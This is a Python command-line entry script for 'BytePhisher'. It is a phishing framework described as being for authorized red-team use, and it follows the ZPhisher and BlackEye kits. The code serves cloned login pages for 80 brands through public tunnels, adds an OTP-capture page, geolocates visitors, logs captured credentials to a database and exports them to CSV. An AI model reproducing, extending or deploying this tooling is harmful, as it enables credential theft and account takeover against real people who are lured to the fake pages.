#!/usr/bin/env python3
"""
BytePhisher v1.0 — advanced phishing-simulation framework (security-awareness /
authorized red-team use).

Pure-Python: no PHP. 80 templates, 6 concurrent tunnels, SQLite capture store,
live TUI + optional web dashboard, SMTP spear-phishing module.

Usage:
    python3 bytephisher.py --list
    python3 bytephisher.py -o 3 -t cloudflared
    python3 bytephisher.py -o google -t all --otp --redirect https://example.com
    python3 bytephisher.py --tunnels --port 8080 --web-dashboard
    python3 bytephisher.py --export out.csv

Flags mirror (and extend) PyPhisher/ZPhisher/BlackEye conventions:
    -o  template index (1..80) or slug (google, instagram, ...)
    -t  tunneler: cloudflared | ngrok | localhost_run | serveo | bore | hoplink | all | none
    -u  redirect URL after capture
    -p  local port (default 8080)
    -m  mode: normal | test   (test = no tunnels, local only)
"""
import argparse
import os
import sys
import time
import signal

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

from core import server as srv
from core import capture as cap
from core import templates as tpl
from tunnels import REGISTRY as TUNNEL_REGISTRY, run_one, run_all

VERSION = "1.0"
TEMPLATES_DIR = os.path.join(HERE, "templates")
DEFAULT_DB = os.path.join(HERE, "data", "bytephisher.db")
CONFIG_PATH = os.path.join(HERE, "config", "config.yaml")


# ---------------------------------------------------------------- config ----
def load_config():
    cfg = {
        "port": 8080, "db_path": DEFAULT_DB, "geo_provider": "ipapi",
        "redirect_url": "", "tunneler_default": "cloudflared", "otp_default": False,
    }
    try:
        import yaml
        if os.path.isfile(CONFIG_PATH):
            with open(CONFIG_PATH, encoding="utf-8") as f:
                cfg.update(yaml.safe_load(f) or {})
    except Exception as e:
        print(f"[bytephisher] config load skipped: {e}")
    if not os.path.isabs(cfg.get("db_path", "")):
        cfg["db_path"] = os.path.join(HERE, cfg["db_path"])
    return cfg


# ------------------------------------------------------------- templates ----
def load_manifest():
    import json
    man_path = os.path.join(TEMPLATES_DIR, "templates.json")
    if not os.path.isfile(man_path):
        print("[bytephisher] templates not generated yet — running generator ...")
        sys.path.insert(0, os.path.join(HERE, "tools"))
        from gen_templates import main as gen_main
        gen_main()
    with open(man_path, encoding="utf-8") as f:
        return json.load(f)


def resolve_template(man, option):
    """Accepts index ('3'), slug ('google'), or None (menu)."""
    if option is None:
        print_templates(man)
        try:
            option = input("Select template [1-80] > ").strip()
        except EOFError:
            sys.exit(2)
    if str(option).isdigit():
        idx = int(option)
        for t in man:
            if t["index"] == idx:
                return t
        raise SystemExit(f"[bytephisher] no template with index {idx}")
    s = str(option).lower().strip()
    for t in man:
        if t["slug"] == s or s in t["dir"].lower():
            return t
    raise SystemExit(f"[bytephisher] no template matching '{option}'")


def print_templates(man):
    print(f"\n  BytePhisher templates ({len(man)}):")
    for t in man:
        print(f'   {t["index"]:>3}. {t["name"]:<22} [{t["slug"]}]')
    print()


# -------------------------------------------------------------- banners -----
BANNER = r"""
  ____        _         ____  _     _     _
 | __ ) _   _| |_ ___  |  _ \| |__ (_)___| |__   ___ _ __
 |  _ \| | | | __/ _ \ | |_) | '_ \| / __| '_ \ / _ \ '__|
 | |_) | |_| | ||  __/ |  __/| | | | \__ \ | | |  __/ |
 |____/ \__, |\__\___| |_|   |_| |_|_|___/_| |_|\___|_|
        |___/     v{ver}   pure-python | 80 templates | 6 tunnels
"""

def banner():
    print(BANNER.format(ver=VERSION))


# ------------------------------------------------------------- main run -----
def main():
    ap = argparse.ArgumentParser(
        prog="bytephisher", add_help=True,
        description="BytePhisher — advanced phishing-simulation framework")
    ap.add_argument("-o", "--option", help="template index (1-80) or slug")
    ap.add_argument("-t", "--tunneler", default=None,
                    help="cloudflared|ngrok|localhost_run|serveo|bore|hoplink|all|none")
    ap.add_argument("-u", "--url", dest="redirect", default=None, help="redirect URL after capture")
    ap.add_argument("-p", "--port", type=int, default=None, help="local port (default 8080)")
    ap.add_argument("-m", "--mode", default="normal", choices=["normal", "test"],
                    help="normal = tunnels up; test = local only")
    ap.add_argument("--otp", action="store_true", help="serve OTP page after credential submit")
    ap.add_argument("--tls", action="store_true", help="serve HTTPS (needs --cert)")
    ap.add_argument("--cert", default=None, help="PEM cert (+key at same path with 'key' in name)")
    ap.add_argument("--geo", default=None, choices=["ipapi", "ipinfo", "off"], help="geo provider")
    ap.add_argument("--list", action="store_true", help="list templates and exit")
    ap.add_argument("--tunnels", action="store_true", help="list tunnelers and exit")
    ap.add_argument("--web-dashboard", action="store_true", help="start Flask dashboard on :8090")
    ap.add_argument("--web-port", type=int, default=8090, help="web dashboard port")
    ap.add_argument("--export", metavar="PATH", help="export captures to CSV and exit")
    ap.add_argument("--no-tui", action="store_true", help="print captures, no live TUI")
    ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
    args = ap.parse_args()

    cfg = load_config()
    db = cap.CaptureDB(args.export and cfg["db_path"] or cfg["db_path"])

    if args.export:
        path = db.export_csv(args.export)
        print(f"[bytephisher] exported captures -> {path}")
        print(f"[bytephisher] stats: {db.stats()}")
        return 0

    if args.tunnels:
        print("\n  Tunnelers:")
        for name in TUNNEL_REGISTRY:
            print(f"   - {name}")
        print("\n  Usage: -t cloudflared   |   -t all   |   -t none\n")
        return 0

    man = load_manifest()
    if args.list:
        print_templates(man)
        return 0

    banner()

    site = resolve_template(man, args.option)
    port = args.port or cfg.get("port", 8080)
    redirect = args.redirect if args.redirect is not None else cfg.get("redirect_url", "")
    geo = args.geo or cfg.get("geo_provider", "ipapi")
    tunneler = (args.tunneler or cfg.get("tunneler_default") or "none").lower()
    otp = args.otp or bool(cfg.get("otp_default"))

    print(f"[bytephisher] template : {site['name']}  ({site['dir']})")
    print(f"[bytephisher] port     : {port}")
    print(f"[bytephisher] geo      : {geo}")
    print(f"[bytephisher] otp page : {'on' if otp else 'off'}")
    print(f"[bytephisher] redirect : {redirect or '(thank-you page)'}")

    httpd, _Handler = srv.serve(
        TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
        geo_provider=geo, redirect_url=redirect, otp=otp,
        tls=args.tls, cert_path=args.cert)
    # serve_forever() must run in its own thread, otherwise the socket is bound
    # but never accepts connections while the CLI sits in the live-dashboard loop.
    import threading
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    print(f"[bytephisher] server up on 0.0.0.0:{port}")

    # --- web dashboard (optional) ---
    if args.web_dashboard:
        try:
            from dashboard import web_dashboard
            web_dashboard(port=args.web_port, db=db)
            print(f"[bytephisher] web dashboard: http://127.0.0.1:{args.web_port}")
        except Exception as e:
            print(f"[bytephisher] web dashboard failed: {e}")

    # --- tunnels ---
    urls = {}
    if args.mode != "test" and tunneler not in ("none", ""):
        print(f"[bytephisher] starting tunneler(s): {tunneler} ...")
        if tunneler == "all":
            urls = run_all(port)
        else:
            urls = {tunneler: run_one(tunneler, port)}
        print("\n[bytephisher] public URLs:")
        live = [u for u in urls.values() if u]
        for name, u in urls.items():
            print(f"   {name:<14} {u or 'FAILED'}")
        if not live:
            print("   (none live — falling back to local-only mode)")
        print()
    else:
        print(f"[bytephisher] local-only mode. Open: http://127.0.0.1:{port}\n")

    # --- live loop ---
    stop = {"flag": False}
    def _sig(_s, _f):
        stop["flag"] = True
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    t0 = time.time()
    try:
        if args.no_tui or not sys.stdout.isatty():
            from dashboard import render_plain
            while not stop["flag"]:
                print("\033[2J\033[H", end="")   # ANSI clear (no TERM dependency)
                render_plain(db.all(40), db.stats())
                print("\n[ctrl+c to stop]")
                time.sleep(3)
        else:
            from dashboard import live_loop
            live_loop(db, stop, refresh=1.5)
    except KeyboardInterrupt:
        pass
    finally:
        runtime = int(time.time() - t0)
        stats = db.stats()
        print("\n" + "=" * 62)
        print("  BYTEPHISHER SESSION SUMMARY")
        print("=" * 62)
        print(f"  runtime            : {runtime // 60}m {runtime % 60}s")
        print(f"  total captures     : {stats['total_captures']}")
        print(f"  credential captures: {stats['credentials']}")
        print(f"  unique visitors    : {stats['visitors']}")
        if urls:
            print("  public urls:")
            for n, u in urls.items():
                if u:
                    print(f"    {n:<14} {u}")
        print("=" * 62)
        try:
            httpd.shutdown()
        except Exception:
            pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
